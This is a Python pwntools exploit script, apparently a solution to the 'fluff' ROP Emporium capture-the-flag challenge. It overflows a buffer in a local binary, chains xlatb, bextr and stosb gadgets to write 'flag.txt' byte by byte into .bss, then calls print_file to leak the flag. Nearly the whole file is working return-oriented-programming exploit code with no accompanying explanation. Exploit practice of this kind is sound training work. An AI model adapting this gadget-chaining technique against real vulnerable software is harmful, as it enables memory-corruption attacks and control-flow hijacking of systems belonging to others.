#!/bin/python3

from pwn import *

context.clear(arch='amd64')

filename = './fluff'

elf = ELF(filename)

io = process(filename)

# variables

input_string = b'flag.txt'
char_addresses = []

# gadgets

r  = ROP(elf)

xlat    = p64(0x400628)         # xlatb; ret;
bextr   = p64(0x40062a)         # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
stosb   = p64(0x400639)         # stosb byte ptr [rdi], al; ret;
pop_rdi = p64(r.rdi.address)    # pop rdi; ret;
bss     = elf.bss()

# helper functions

def find_string(string):
    f = elf.file.read()
    
    for i in string:
        offset = f.find(i)
        address = 0x400000 + offset
        char_addresses.append(address)

def write_string(string, index):
    rop = ROP(elf)
    curr_rax = 0xb

    if(index != 0):
        curr_rax = string[index-1]
    rop.raw(bextr)
    rop.raw(0x4000)
    p = char_addresses[index] - curr_rax - 0x3ef2
    rop.raw(p64(p))
    rop.raw(xlat)
    rop.raw(pop_rdi)
    rop.raw(p64(bss+index))
    rop.raw(stosb)

    return rop.chain()

# main

find_string(input_string)

payload = b''
payload += cyclic(40)

for i in range(0,8):
    payload += write_string(input_string, i)

r.call('print_file', [bss])

payload += r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))